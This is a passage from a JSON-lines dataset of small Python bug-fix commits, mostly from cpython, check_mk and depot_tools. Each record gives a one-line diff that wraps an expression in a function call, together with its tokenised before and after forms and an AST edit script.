2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"call\", 3, 24, 3, 42], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:os\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:path\", \"T\"], 2]]"}
{"project": "cpython", "commit_sha": "09c9e38a73b084fb9261b0ec14032555849b0ed7", "parent_sha": "84b01d5d49c7b9151cc009002a2ec6096d8556dc", "file_path": "Lib/test/test_runpy.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -182,7 +182,7 @@ class RunModuleTestCase(unittest.TestCase, CodeExecutionMixin):\n     def _make_pkg(self, source, depth, mod_base=\"runpy_test\"):\n         pkg_name = \"__runpy_pkg__\"\n         test_fname = mod_base+os.extsep+\"py\"\n-        pkg_dir = sub_dir = tempfile.mkdtemp()\n+        pkg_dir = sub_dir = os.path.realpath(tempfile.mkdtemp())\n         if verbose > 1: print(\"  Package tree in:\", sub_dir)\n         sys.path.insert(0, pkg_dir)\n         if verbose > 1: print(\"  Updated sys.path:\", sys.path[0])\n", "before": "pkg_dir = sub_dir = tempfile . mkdtemp ( )", "after": "pkg_dir = sub_dir = os . path . realpath ( tempfile . mkdtemp ( ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 29, 3, 47], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 29, 3, 47], [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:realpath\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"call\", 3, 29, 3, 47], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:os\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:path\", \"T\"], 2]]"}
{"project": "check_mk", "commit_sha": "e5d1f16edba0d8976e90cd567036baf8c15d1396", "parent_sha": "259af1bb334e159aa9c08f72dcbab5b4a5cc8213", "file_path": "web/htdocs/valuespec.py", "project_url": "https://github.com/opinkerfi/check_mk", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -637,7 +637,7 @@ class CascadingDropdown(ValueSpec):\n             options.append((str(nr), title))\n             if value == val or (\n                 type(value) == tuple and value[0] == val):\n-                def_val = nr\n+                def_val = str(nr)\n \n         vp = varprefix + \"_sel\"\n         onchange=\"valuespec_cascading_change(this, '%s', %d);\" % (varprefix, len(self._choices))  \n", "before": "def_val = nr", "after": "def_val = str ( nr )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"assignment\", 3, 17, 3, 29], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:str\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:nr\", 3, 27, 3, 29], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "cpython", "commit_sha": "72bf457c8744c171431029bbaff0f4268918bf2f", "parent_sha": "170bac94f7e5b7ad0c74610690a23c92893abafb", "file_path": "Lib/urllib/request.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2159,7 +2159,7 @@ if sys.platform == 'darwin':\n \n         def ip2num(ipAddr):\n             parts = ipAddr.split('.')\n-            parts = map(int, parts)\n+            parts = list(map(int, parts))\n             if len(parts) != 4:\n                 parts = (parts + [0, 0, 0, 0])[:4]\n             return (parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]\n", "before": "parts = map ( int , parts )", "after": "parts = list ( map ( int , parts ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 21, 3, 36], [\"identifier:list\", \"T\"], 0], [\"Insert\", [\"call\", 3, 21, 3, 36], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 21, 3, 36], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "cpython", "commit_sha": "02ddff42380be032c59d02a3e45e8f96a4a57778", "parent_sha": "091e6c2686e81ded5b58a540a3b3282a4777339e", "file_path": "Lib/urllib/request.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2163,7 +2163,7 @@ if sys.platform == 'darwin':\n \n         def ip2num(ipAddr):\n             parts = ipAddr.split('.')\n-            parts = map(int, parts)\n+            parts = list(map(int, parts))\n             if len(parts) != 4:\n                 parts = (parts + [0, 0, 0, 0])[:4]\n             return (parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]\n", "before": "parts = map ( int , parts )", "after": "parts = list ( map ( int , parts ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 21, 3, 36], [\"identifier:list\", \"T\"], 0], [\"Insert\", [\"call\", 3, 21, 3, 36], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 21, 3, 36], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "cpython", "commit_sha": "5cfec95db5c701efa8187658d27c1c0bd06f8f8b", "parent_sha": "831497a8f2741813e9ee1ba07d31de109589c173", "file_path": "Lib/test/test_cmd_line_script.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -188,7 +188,7 @@ class CmdLineTest(unittest.TestCase):\n             while True:\n                 data = stderr.read(4)\n                 if support.verbose:\n-                    print(\"repl stderr[:4]:\", data)\n+                    print(\"repl stderr[:4]:\", repr(data))\n                     sys.stdout.flush()\n                 if data == b\">>> \":\n                     break\n", "before": "print ( \"repl stderr[:4]:\" , data )", "after": "print ( \"repl stderr[:4]:\" , repr ( data ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 26, 3, 52], [\"call\", \"N0\"], 3], [\"Insert\", [\"argument_list\", 3, 26, 3, 52], [\"):)\", \"T\"], 4], [\"Insert\", \"N0\", [\"identifier:repr\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:data\", 3, 47, 3, 51], 1], [\"Move\", \"N1\", [\"):)\", 3, 51, 3, 52], 2]]"}
{"project": "check_mk", "commit_sha": "84b671c78a3afb893fe51d0eeb9866a2a3389712", "parent_sha": "6119f4104d9fc5618fe7dbf26d85c3960a11b9a9", "file_path": "web/htdocs/wato.py", "project_url": "https://github.com/opinkerfi/check_mk", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2230,7 +2230,7 @@ def interactive_progress(items, title, stats, finishvars, timewait, success_stat\n     html.write(\"</table>\")\n     html.write(\"</center>\")\n     json_items    = '[ %s ]' % ','.join([ \"'\" + h + \"'\" for h in items ])\n-    success_stats = '[ %s ]' % ','.join(success_stats)\n+    success_stats = '[ %s ]' % ','.join(map(str, success_stats))\n     # Remove all sel_* variables. We do not need them for our ajax-calls.\n     # They are just needed for the Abort/Finish links. Those must be converted\n     # to POST.\n", "before": "success_stats = '[ %s ]' % ',' . join ( success_stats )", "after": "success_stats = '[ %s ]' % ',' . join ( map ( str , success_stats ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 40, 3, 55], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 40, 3, 55], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"identifier:map\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"identifier:str\", \"T\"], 1], [\"Insert\", \"N1\", [\",:,\", \"T\"], 2], [\"Move\", \"N1\", [\"identifier:success_stats\", 3, 41, 3, 54], 3], [\"Move\", \"N1\", [\"):)\", 3, 54, 3, 55], 4]]"}
{"project": "check_mk", "commit_sha": "ba41fa3c3aecfc60ef62a6cc32deae4e34115e1c", "parent_sha": "0e4ab03633dcfd0541821f0ac836c96953068e70", "file_path": "web/htdocs/wato.py", "project_url": "https://github.com/opinkerfi/check_mk", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -5360,7 +5360,7 @@ def mode_globalvars(phase):\n \n def mode_edit_configvar(phase):\n     if phase == \"title\":\n-        return \"Global configuration settings for Check_MK\"\n+        return _(\"Global configuration settings for Check_MK\")\n \n     elif phase == \"buttons\":\n         html.context_button(_(\"Abort\"), make_link([(\"mode\", \"globalvars\")]), \"abort\")\n", "before": "return \"Global configuration settings for Check_MK\"", "after": "return _ ( \"Global configuration settings for Check_MK\" )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 9, 3, 60], [\"call\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:_\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"string:\\\"Global configuration settings for Check_MK\\\"\", 3, 16, 3, 60], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "check_mk", "commit_sha": "42066e905012a49261d5abc4fddecae246c79c33", "parent_sha": "5a3c160bd79e3af3719649a7edf61907935f64b8", "file_path": "web/plugins/icons/builtin.py", "project_url": "https://github.com/opinkerfi/check_mk", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -364,7 +364,7 @@ multisite_icons.append({\n def paint_flapping(what, row, tags, custom_vars):\n     if row[what + \"_is_flapping\"]:\n         return '<img class=icon title=\"%s\" src=\"images/icon_flapping.gif\">' % \\\n-                                          _('This %s is flapping') % what\n+                                          _('This %s is flapping') % _(what)\n \n multisite_icons.append({\n     'columns':         [ 'is_flapping' ],\n", "before": "return '<img class=icon title=\"%s\" src=\"images/icon_flapping.gif\">' % _ ( 'This %s is flapping' ) % what", "after": "return '<img class=icon title=\"%s\" src=\"images/icon_flapping.gif\">' % _ ( 'This %s is flapping' ) % _ ( what )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"binary_operator\", 2, 16, 3, 74], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:_\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:what\", 3, 70, 3, 74], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "bcc", "commit_sha": "06fb0fa79e5402912fcc9d089fd4d9b2beef5639", "parent_sha": "715f7e6ec7201720dbebbd69e25faa6192006290", "file_path": "src/python/bcc/__init__.py", "project_url": "https://github.com/jcanseco/bcc", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -422,7 +422,7 @@ class BPF(object):\n                 fn = line.rstrip().split()[0]\n                 if re.match(event_re, fn) and fn not in blacklist:\n                     fns.append(fn)\n-        return fns\n+        return set(fns)     # Some functions may appear more than once\n \n     def _check_probe_quota(self, num_new_probes):\n         global _num_open_probes\n", "before": "return fns", "after": "return set ( fns )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 9, 3, 19], [\"call\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:set\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:fns\", 3, 16, 3, 19], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "pyload", "commit_sha": "8de3bb1f3c13013036d166fef1437865316512a5", "parent_sha": "52f6599748ef61219112111dc5db71f3342b076d", "file_path": "pyload/plugins/network/CurlRequest.py", "project_url": "https://github.com/SeppPenner/pyload", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -221,7 +221,7 @@ class CurlRequest(Request):\n             rep = self.getResponse()\n \n         self.c.setopt(pycurl.POSTFIELDS, \"\")\n-        self.lastURL = url\n+        self.lastURL = myquote(url)\n         self.lastEffectiveURL = self.c.getinfo(pycurl.EFFECTIVE_URL)\n         self.code = self.verifyHeader()\n \n", "before": "self . lastURL = url", "after": "self . lastURL = myquote ( url )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 27], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:myquote\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:url\", 3, 24, 3, 27], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "cpython", "commit_sha": "622a1778a93d775f736cf08fa78226e8c982f74c", "parent_sha": "3273e908a45acbd8fe6f860c55f77700d0c22185", "file_path": "Lib/py_compile.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -16,7 +16,7 @@ def compile(file, cfile = None):\n \tf = open(file)\n \tcodestring = f.read()\n \tf.close()\n-\ttimestamp = os.stat(file)[8]\n+\ttimestamp = long(os.stat(file)[8])\n \tcodeobject = __builtin__.compile(codestring, file, 'exec')\n \tif not cfile:\n \t\tcfile = file + 'c'\n", "before": "timestamp = os . stat ( file ) [ 8 ]", "after": "timestamp = long ( os . stat ( file ) [ 8 ] )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"assignment\", 3, 2, 3, 30], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:long\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"subscript\", 3, 14, 3, 30], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "cpython", "commit_sha": "8add14b3ad835edf327cdd94a1c017aa543114f8", "parent_sha": "f60795bc9eeb6589a88cdf2151b38f7f69304c2f", "file_path": "Lib/webbrowser.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -24,7 +24,7 @@ def get(using=None):\n     for browser in alternatives:\n         if browser.find('%s') > -1:\n             # User gave us a command line, don't mess with it.\n-            return browser\n+            return GenericBrowser(browser)\n         else:\n             # User gave us a browser name.\n             command = _browsers[browser.lower()]\n", "before": "return browser", "after": "return GenericBrowser ( browser )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 13, 3, 27], [\"call\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:GenericBrowser\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:browser\", 3, 20, 3, 27], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "cpython", "commit_sha": "d367c410c03a9d9c8afb5fa335f8d25c9d0bdf18", "parent_sha": "423a883803f6daf026476d90c14d0117a6a3fb0d", "file_path": "Lib/idlelib/IOBinding.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -178,7 +178,7 @@ class IOBinding:\n         self.fixlastline()\n         try:\n             f = open(filename, \"w\")\n-            chars = self.text.get(\"1.0\", \"end-1c\")\n+            chars = str(self.text.get(\"1.0\", \"end-1c\"))\n             f.write(chars)\n             f.close()\n             ## print \"saved to\", `filename`\n", "before": "chars = self . text . get ( \"1.0\" , \"end-1c\" )", "after": "chars = str ( self . text . get ( \"1.0\" , \"end-1c\" ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 21, 3, 51], [\"identifier:str\", \"T\"], 0], [\"Insert\", [\"call\", 3, 21, 3, 51], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 21, 3, 51], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "cpython", "commit_sha": "2675a49d02954ee72373163417eeba835b09d3a5", "parent_sha": "6c3a797acc99ab7cb5dff4169f6b03135d6bc347", "file_path": "Lib/distutils/core.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -87,7 +87,7 @@ def setup (**attrs):\n         klass = Distribution\n \n     if not attrs.has_key('script_name'):\n-        attrs['script_name'] = sys.argv[0]\n+        attrs['script_name'] = os.path.basename(sys.argv[0])\n     if not attrs.has_key('script_args'):\n         attrs['script_args'] = sys.argv[1:]\n \n", "before": "attrs [ 'script_name' ] = sys . argv [ 0 ]", "after": "attrs [ 'script_name' ] = os . path . basename ( sys . argv [ 0 ] )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 43], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N1\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:basename\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Move\", \"N2\", [\"subscript\", 3, 32, 3, 43], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2], [\"Insert\", \"N3\", [\"identifier:os\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:path\", \"T\"], 2]]"}
{"project": "cpython", "commit_sha": "7e4561666353f2ed3ca99cc7ec835d5c0f0b3c67", "parent_sha": "da2af3733601df880edbc59ed33fb088c96035c8", "file_path": "Lib/locale.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -285,7 +285,7 @@ def _parse_localename(localename):\n             return code, 'iso-8859-15'\n \n     if '.' in code:\n-        return code.split('.')[:2]\n+        return tuple(code.split('.')[:2])\n     elif code == 'C':\n         return None, None\n     raise ValueError, 'unknown locale: %s' % localename\n", "before": "return code . split ( '.' ) [ : 2 ]", "after": "return tuple ( code . split ( '.' ) [ : 2 ] )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 9, 3, 35], [\"call\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:tuple\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"subscript\", 3, 16, 3, 35], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "cpython", "commit_sha": "9daf12d7a1be951098614723d595ad179aed37a3", "parent_sha": "ac7f73b0086afc6818287614e7b28b18d6110fdc", "file_path": "Lib/test/test_enumerate.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -105,7 +105,7 @@ class EnumerateTestCase(unittest.TestCase):\n     def test_tuple_reuse(self):\n         # Tests an implementation detail where tuple is reused\n         # whenever nothing else holds a reference to it\n-        self.assertEqual(len(Set(map(id, list(self.seq)))), len(self.seq))\n+        self.assertEqual(len(Set(map(id, list(enumerate(self.seq))))), len(self.seq))\n         self.assertEqual(len(Set(map(id, enumerate(self.seq)))), min(1,len(self.seq)))\n \n class MyEnum(enumerate):\n", "before": "self . assertEqual ( len ( Set ( map ( id , list ( self . seq ) ) ) ) , len ( self . seq ) )", "after": "self . assertEqual ( len ( Set ( map ( id , list ( enumerate ( self . seq ) ) ) ) ) , len ( self . seq ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 46, 3, 56], [\"(:(\", \"T\"], 0], [\"Insert\", [\"argument_list\", 3, 46, 3, 56], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 46, 3, 56], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"identifier:enumerate\", \"T\"], 0], [\"Move\", \"N0\", [\"argument_list\", 3, 46, 3, 56], 1]]"}
{"project": "rapidsms", "commit_sha": "c2549d03de9d39a09c2629c72736dd8695066a02", "parent_sha": "4b9bc6fbe0e498d8895bfc5def94acd1d552983a", "file_path": "lib/rapidsms/message.py", "project_url": "https://github.com/maniacs-satm/rapidsms", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -33,7 +33,7 @@ class Message(object):\n         self.processed = False\n     \n     def __unicode__(self):\n-        return self.text\n+        return unicode(self.text)\n \n     @property\n     def connection(self):\n", "before": "return self . text", "after": "return unicode ( self . text )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 9, 3, 25], [\"call\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:unicode\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"attribute\", 3, 16, 3, 25], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "cpython", "commit_sha": "16aef0768984de7607cc23b5aa6e9ddb752bc00f", "parent_sha": "4face2a6c0117095f5b9e92cf45afcbe4cc325d1", "file_path": "Tools/scripts/checkappend.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -52,7 +52,7 @@ def main():\n     try:\n         opts, args = getopt.getopt(sys.argv[1:], \"v\")\n     except getopt.error, msg:\n-        errprint(msg + \"\\n\\n\" + __doc__)\n+        errprint(str(msg) + \"\\n\\n\" + __doc__)\n         return\n     for opt, optarg in opts:\n         if opt == '-v':\n", "before": "errprint ( msg + \"\\n\\n\" + __doc__ )", "after": "errprint ( str ( msg ) + \"\\n\\n\" + __doc__ )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 18, 3, 30], [\"call\", \"N0\"], 0], [\"Insert\", \"N0\", [\"identifier:str\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:msg\", 3, 18, 3, 21], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "cpython", "commit_sha": "8e9fab2dd9f61e3e8c606907942c8e420a76a408", "parent_sha": "c04064bbad6856b633a5a048b963027b89f974e0", "file_path": "Lib/curses/textpad.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -53,7 +53,7 @@ class Textbox:\n         last = self.maxx\n         while 1:\n             if ascii.ascii(self.win.inch(y, last)) != ascii.SP:\n-                last = last + 1\n+                last = min(self.maxx, last+1)\n                 break\n             elif last == 0:\n                 break\n", "before": "last = last + 1", "after": "last = min ( self . maxx , last + 1 )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"assignment\", 3, 17, 3, 32], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:min\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 1], [\"Insert\", \"N1\", [\",:,\", \"T\"], 2], [\"Move\", \"N1\", [\"binary_operator\", 3, 24, 3, 32], 3], [\"Insert\", \"N1\", [\"):)\", \"T\"], 4], [\"Insert\", \"N2\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:maxx\", \"T\"], 2]]"}
{"project": "depot_tools", "commit_sha": "de9c675a9be08c8daf547ccd404c3641610ada5d", "parent_sha": "f547c80c36079e60ff686549bec5a1b4dadbe2da", "file_path": "rietveld.py", "project_url": "https://github.com/withtone/depot_tools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -257,7 +257,7 @@ class Rietveld(object):\n     return self.post('/%d/edit_flags' % issue, [\n         ('last_patchset', str(patchset)),\n         ('xsrf_token', self.xsrf_token()),\n-        (flag, value)])\n+        (flag, str(value))])\n \n   def search(\n       self,\n", "before": "return self . post ( '/%d/edit_flags' % issue , [ ( 'last_patchset' , str ( patchset ) ) , ( 'xsrf_token' , self . xsrf_token ( ) ) , ( flag , value ) ] )", "after": "return self . post ( '/%d/edit_flags' % issue , [ ( 'last_patchset' , str ( patchset ) ) , ( 'xsrf_token' , self . xsrf_token ( ) ) , ( flag , str ( value ) ) ] )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"tuple\", 3, 9, 3, 22], [\"call\", \"N0\"], 3], [\"Insert\", [\"tuple\", 3, 9, 3, 22], [\"):)\", \"T\"], 4], [\"Insert\", \"N0\", [\"identifier:str\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:value\", 3, 16, 3, 21], 1], [\"Move\", \"N1\", [\"):)\", 3, 21, 3, 22], 2]]"}
{"project": "depot_tools", "commit_sha": "bd2a9b972016c89c3b077862e1bea09302f2b205", "parent_sha": "bbe9cc5aa8a273f1807a99af625daede80722207", "file_path": "git_cl.py", "project_url": "https://github.com/withtone/depot_tools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2754,7 +2754,7 @@ def CMDformat(parser, args):\n       sys.stdout.write(stdout)\n   else:\n     env = os.environ.copy()\n-    env['PATH'] = os.path.dirname(clang_format_tool)\n+    env['PATH'] = str(os.path.dirname(clang_format_tool))\n     # diff_output is a patch to send to clang-format-diff.py\n     try:\n       script = clang_format.FindClangFormatScriptInChromiumTree(\n", "before": "env [ 'PATH' ] = os . path . dirname ( clang_format_tool )", "after": "env [ 'PATH' ] = str ( os . path . dirname ( clang_format_tool ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 19, 3, 53], [\"identifier:str\", \"T\"], 0], [\"Insert\", [\"call\", 3, 19, 3, 53], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 19, 3, 53], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "depot_tools", "commit_sha": "604a5895efedd1e11fc0f5dbdb2bcf5c18dcc877", "parent_sha": "e155bcdd1d0567a06b986ae533c0b129600a6dca", "file_path": "presubmit_support.py", "project_url": "https://github.com/withtone/depot_tools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -146,7 +146,7 @@ class OutputApi(object):\n       for index, item in enumerate(self._items):\n         output.write('  ')\n         # Write separately in case it's unicode.\n-        output.write(item)\n+        output.write(str(item))\n         if index < len(self._items) - 1:\n           output.write(' \\\\')\n         output.write('\\n')\n", "before": "output . write ( item )", "after": "output . write ( str ( item ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 21, 3, 27], [\"(:(\", \"T\"], 0], [\"Insert\", [\"argument_list\", 3, 21, 3, 27], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 21, 3, 27], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"identifier:str\", \"T\"], 0], [\"Move\", \"N0\", [\"argument_list\", 3, 21, 3, 27], 1]]"}
